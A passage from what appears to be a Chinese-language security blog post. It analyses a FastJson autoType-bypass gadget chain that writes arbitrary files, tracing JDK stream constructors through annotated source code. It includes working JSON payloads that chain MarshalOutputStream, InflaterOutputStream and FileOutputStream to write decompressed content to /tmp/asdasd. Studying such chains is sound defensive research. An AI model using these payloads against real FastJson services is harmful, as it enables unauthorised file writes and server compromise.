<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据给定的 File 对象创建一个文件输出流。</span></span><br><span class="line"><span class="comment"> * 如果 append=true，则以“追加”方式写入文件末尾；否则从开头写（可能覆盖原有内容）。</span></span><br><span class="line"><span class="comment"> * 会创建一个新的 FileDescriptor 来代表底层文件连接。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 安全检查：</span></span><br><span class="line"><span class="comment"> *  - 若存在 SecurityManager，则调用 security.checkWrite(path) 进行写权限校验。</span></span><br><span class="line"><span class="comment"> *  - 若路径非法、是目录、无法创建或无法打开等，会抛出 FileNotFoundException。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> file   要打开的文件（File 实例）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> append 是否追加写入（true=追加；false=非追加）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> FileNotFoundException  文件是目录、不存在但无法创建、或其它原因导致无法打开</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException      存在 SecurityManager 且拒绝对该路径的写入</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">FileOutputStream</span><span class="params">(File file, <span class="type">boolean</span> append)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 取出路径字符串；允许 file==null（随后会抛 NPE）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (file != <span class="literal">null</span> ? file.getPath() : <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 安全管理器检查（普通进程通常为 null，不做检查）</span></span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="literal">null</span>) &#123;</span><br><span class="line">        security.checkWrite(name);  <span class="comment">// 无写权限直接抛 SecurityException</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 空指针检查：如果 file 为 null，则 name 也为 null，这里抛 NPE</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 路径有效性检查：例如包含非法字符（不同平台实现不同）</span></span><br><span class="line">    <span class="keyword">if</span> (file.isInvalid()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FileNotFoundException</span>(<span class="string">&quot;Invalid file path&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 为该流创建新的文件描述符（fd）</span></span><br><span class="line">    <span class="built_in">this</span>.fd = <span class="keyword">new</span> <span class="title class_">FileDescriptor</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 让 fd 反向关联到当前 FileOutputStream，</span></span><br><span class="line">    <span class="comment">//    便于资源管理/最终化（finalize）时能关闭底层句柄</span></span><br><span class="line">    fd.attach(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 记录“是否追加写”的标志位</span></span><br><span class="line">    <span class="built_in">this</span>.append = append;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 保存路径字符串（用于错误信息、toString 等）</span></span><br><span class="line">    <span class="built_in">this</span>.path = name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8) 真正打开文件（调用本地方法 open0），获得 OS 级文件句柄</span></span><br><span class="line">    <span class="comment">//    - name：路径</span></span><br><span class="line">    <span class="comment">//    - append：若为 true，则以 O_APPEND 打开（写指针永远在末尾）</span></span><br><span class="line">    <span class="comment">//              若为 false，通常是 O_TRUNC（清空）或覆盖写（具体由实现/构造器而定）</span></span><br><span class="line">    open(name, append);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后是 <code>java.util.zip.InflaterOutputStream</code>：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/asdasd&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span> <span class="number">100</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><code>InflaterOutputStream</code> 同样继承于 <code>AutoCloseable</code>，可以通过 <code>checkAutoType</code> 的检查。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/09/09/Java%20FastJson/images/InflaterOutputStream.png"
                      alt="InflaterOutputStream"
                ></p>
<p>对应调用如下构造函数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用给定的“解压器”和“缓冲区大小”创建一个 InflaterOutputStream。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> out   解压后的明文要写入到的下游输出流（例如 FileOutputStream）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> infl  用于解压的 zlib 解压器（Inflater）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bufLen 解压时使用的中间缓冲区大小（&gt;0）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 当 bufLen &lt;= 0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException 当 out 或 infl 为空</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InflaterOutputStream</span><span class="params">(OutputStream out, Inflater infl, <span class="type">int</span> bufLen)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(out);                 <span class="comment">// 把下游输出流保存到父类 FilterOutputStream.out</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 基本健壮性检查 ——</span></span><br><span class="line">    <span class="keyword">if</span> (out == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Null output&quot;</span>);   <span class="comment">// 没有下游目的地，不可继续</span></span><br><span class="line">    <span class="keyword">if</span> (infl == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Null inflater&quot;</span>); <span class="comment">// 没有解压器，不可继续</span></span><br><span class="line">    <span class="keyword">if</span> (bufLen &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Buffer size &lt; 1&quot;</span>); <span class="comment">// 缓冲区必须正数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// —— 关键初始化 —— </span></span><br><span class="line">    inf = infl;                  <span class="comment">// 绑定将要使用的解压器（持有压缩输入数据/状态）</span></span><br><span class="line">    buf = <span class="keyword">new</span> <span class="title class_">byte</span>[bufLen];      <span class="comment">// 分配解压用的中间缓冲（承接 inflate() 产出的明文再写出）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>InflaterOutputStream</code> 继承自 <code>FilterOutputStream</code>，你把<strong>压缩过（deflate&#x2F;zlib）的字节</strong>写进它的 <code>write(...)</code>，它会<strong>当场解压</strong>，再把<strong>解压后的明文</strong>写到它包裹的下游 <code>OutputStream</code>（比如 <code>FileOutputStream</code>、<code>SocketOutputStream</code>）。</p>
<p><code>Inflater</code> 就 <strong>zlib&#x2F;deflate 解压器的“状态机”对象</strong>。<code>InflaterOutputStream</code> 并不自己解析压缩格式，而是把“压缩输入给 <code>Inflater</code>，再从它那里把<strong>解压后的明文</strong>取出来写到下游的 <code>OutputStream</code>（比如 <code>FileOutputStream</code>）。</p>
<p>当 FastJson 解析到我们 Json 数据中的下面这部分内容时：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>会先将 <code>input</code> 后面的内容进行 Base64 加码，然后调用 <code>Inflater#setInput</code>，从而设置好 <code>Inflater</code> 中的 <code>buf</code>、<code>off</code>、<code>len</code> 属性。这里的 <code>buf</code> 是 <code>Inflater</code> 用来缓存待解压数据的地方。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为解压器提供新的“压缩输入数据”。</span></span><br><span class="line"><span class="comment"> * 典型用法：当 needsInput() 返回 true（表示没有可用的压缩字节）时，再调用本方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 不会拷贝数据，只是记录对数组 b 的引用以及窗口范围 [0, b.length)（零拷贝）。</span></span><br><span class="line"><span class="comment"> * - 调用后，解压将从 b[0 .. b.length) 这段数据中消费压缩字节。</span></span><br><span class="line"><span class="comment"> * - 在这段数据被完全消费（needsInput() 重新变为 true）之前，不要修改/回收 b。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> b 作为压缩输入的字节数组（整段）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> Inflater#needsInput()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInput</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="comment">// 委托给偏移/长度版本，窗口为整段数组</span></span><br><span class="line">    setInput(b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为解压器提供新的“压缩输入数据”窗口。</span></span><br><span class="line"><span class="comment"> * 典型用法：当 needsInput() 返回 true（表示没有可用的压缩字节）时，再调用本方法。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 零拷贝：仅保存对 b 的引用与窗口 [off, off+len)，不复制内容。</span></span><br><span class="line"><span class="comment"> * - 线程安全：对底层 zlib 状态的修改在 zsRef 上同步，避免并发访问同一 Inflater。</span></span><br><span class="line"><span class="comment"> * - 生命周期：在本窗口被完全消费前（len 归零、needsInput() 变为 true），不要改动 b 的对应内容。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> b   承载压缩输入数据的字节数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> off 窗口起始偏移（从 b[off] 开始）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> len 窗口长度（可供解压的字节数）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException              当 b 为 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ArrayIndexOutOfBoundsException    当 off/len 越界或 off+len 超过数组长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> Inflater#needsInput()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInput</span><span class="params">(<span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="comment">// 参数合法性检查：b 不能为 null</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 范围检查：off/len 非负且 off+len 不越界</span></span><br><span class="line">    <span class="keyword">if</span> (off &lt; <span class="number">0</span> || len &lt; <span class="number">0</span> || off &gt; b.length - len) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArrayIndexOutOfBoundsException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同步到 zlib 状态引用：Inflater/Deflater 的底层 z_stream 非线程安全</span></span><br><span class="line">    <span class="keyword">synchronized</span> (zsRef) &#123;</span><br><span class="line">        <span class="comment">// 仅记录“输入窗口”的三元组（零拷贝）</span></span><br><span class="line">        <span class="built_in">this</span>.buf = b;   <span class="comment">// 当前压缩输入的数据源</span></span><br><span class="line">        <span class="built_in">this</span>.off = off; <span class="comment">// 尚未消费的窗口起始位置</span></span><br><span class="line">        <span class="built_in">this</span>.len = len; <span class="comment">// 尚未消费的字节数</span></span><br><span class="line">        <span class="comment">// 之后调用 inflate(...) 会从 [buf, off, len] 中消费数据并递减 len/推进 off</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再后面是 <code> sun.rmi.server.MarshalOutputStream</code>：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/asdasd&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">           <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span> <span class="number">100</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>对应调用的构造函数如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">MarshalOutputStream</span><span class="params">(OutputStream out, <span class="type">int</span> protocolVersion)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">super</span>(out);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>MarshalOutputStream</code> 直接继承于 <code>ObjectOutputStream</code>，因此 <code>super(out)</code> 会直接调用到 <code>ObjectOutputStream</code> 的构造函数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>BlockDataOutputStream#setBlockDataMode</code> 会触发我们传入的 <code>out</code> 的 <code>write</code> 方法调用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将“块数据模式（block data mode）”切换为给定值（true=打开，false=关闭），</span></span><br><span class="line"><span class="comment"> * 返回切换前的旧值。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：</span></span><br><span class="line"><span class="comment"> * - 若新旧模式相同：不做任何事，直接返回当前模式值。</span></span><br><span class="line"><span class="comment"> * - 若新旧模式不同：为保持数据边界一致，先把缓冲区里已有的数据写出去（drain），</span></span><br><span class="line"><span class="comment"> *   再切换模式。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">setBlockDataMode</span><span class="params">(<span class="type">boolean</span> mode)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (blkmode == mode) &#123;</span><br><span class="line">        <span class="comment">// 模式未变化，无需动作；返回当前（也是旧）模式</span></span><br><span class="line">        <span class="keyword">return</span> blkmode;</span><br><span class="line">    &#125;</span><br><span class="line">    drain();        <span class="comment">// 模式切换前先把已缓冲的数据成块写出，避免跨模式“混包”</span></span><br><span class="line">    blkmode = mode; <span class="comment">// 真正切换模式</span></span><br><span class="line">    <span class="keyword">return</span> !blkmode; <span class="comment">// 按 OOS 的约定，这里返回的是“切换前”的旧值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将当前缓冲区（本 BlockDataOutputStream 的内部 buf）中的所有数据</span></span><br><span class="line"><span class="comment"> * 写入到底层输出流 out，但**不调用 out.flush()**。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 如果当前处于块模式（blkmode=true），写数据前会先写入“块头”（block header），</span></span><br><span class="line"><span class="comment"> *   表示接下来这个块的长度；然后再把 buf 的内容写出。</span></span><br><span class="line"><span class="comment"> * - 写完后仅把缓冲区位置复位为 0，并不刷新底层 out。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">drain</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (pos == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 缓冲区为空，无事可做</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (blkmode) &#123;</span><br><span class="line">        <span class="comment">// 在块模式下，先写一个块头：告诉接收方本块 payload 的长度（pos）</span></span><br><span class="line">        <span class="comment">// 内部通常是：长度 ≤255 写 TC_BLOCKDATA(0x77)+1字节长度，</span></span><br><span class="line">        <span class="comment">//            否则写 TC_BLOCKDATALONG(0x7A)+4字节长度（大端）</span></span><br><span class="line">        writeBlockHeader(pos);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把缓冲区的 payload 写到下游流（不 flush）</span></span><br><span class="line">    out.write(buf, <span class="number">0</span>, pos);</span><br><span class="line">    pos = <span class="number">0</span>; <span class="comment">// 清空缓冲区游标</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于这里我们传入的 <code>out</code> 是前面我们构造的 <code>java.util.zip.InflaterOutputStream</code>，因此这里调用的是 <code>InflaterOutputStream#write</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将一段“压缩（zlib/deflate）数据”写入本过滤输出流。</span></span><br><span class="line"><span class="comment"> * 本方法不会把参数 b 的字节原样写出，而是：</span></span><br><span class="line"><span class="comment"> * 1) 先把压缩数据喂给解压器（Inflater）；</span></span><br><span class="line"><span class="comment"> * 2) 调用 inflate(...) 得到“解压后的明文”；</span></span><br><span class="line"><span class="comment"> * 3) 再把明文写入下游输出流（out）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> b   承载“压缩数据”的缓冲区</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> off 压缩数据在 b 中的起始偏移</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> len 压缩数据的长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IndexOutOfBoundsException 当 off &lt; 0，或 len &lt; 0，或 len &gt; b.length - off</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException               当发生 I/O 错误，或该流已关闭</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NullPointerException      当 b 为 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ZipException              当压缩数据格式错误，或需要字典但未提供</span></span><br><span class="line"><span class="comment"> */</span></span><br><span 